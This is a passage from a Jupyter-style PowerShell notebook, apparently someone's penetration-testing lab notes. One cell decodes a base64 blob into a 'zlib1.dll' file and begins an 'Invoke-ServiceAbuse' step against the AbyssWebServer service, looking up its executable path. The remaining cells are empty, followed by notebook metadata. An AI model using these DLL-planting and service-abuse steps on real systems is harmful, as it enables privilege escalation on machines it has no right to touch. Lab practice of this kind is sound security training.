        "$base64string | Out-File b64.txt\n",
        "\n",
        "# On my other system \n",
        "$base64string = Get-Content C:\\Users\\thepcn3rd\\Desktop\\b64.txt\n",
        "[IO.File]::WriteAllBytes(\"zlib1.dll\", [Convert]::FromBase64String($base64string))\n",
        "\n",
        "# Invoke-ServiceAbuse\n",
        "# Service going to be exploited\n",
        "$serviceName = \"AbyssWebServer\"\n",
        "$info = Get-ServiceDetail -Name $serviceName\n",
        "$info.PathName\n",
        ""
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        ""
      ],
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "source": [
        ""
      ],
      "outputs": []
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": ".NET (C#)",
      "language": "C#",
      "name": ".net-csharp"
    },
    "language_info": {
      "file_extension": ".cs",
      "mimetype": "text/x-csharp",
      "name": "C#",
      "pygments_lexer": "csharp",
      "version": "8.0"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}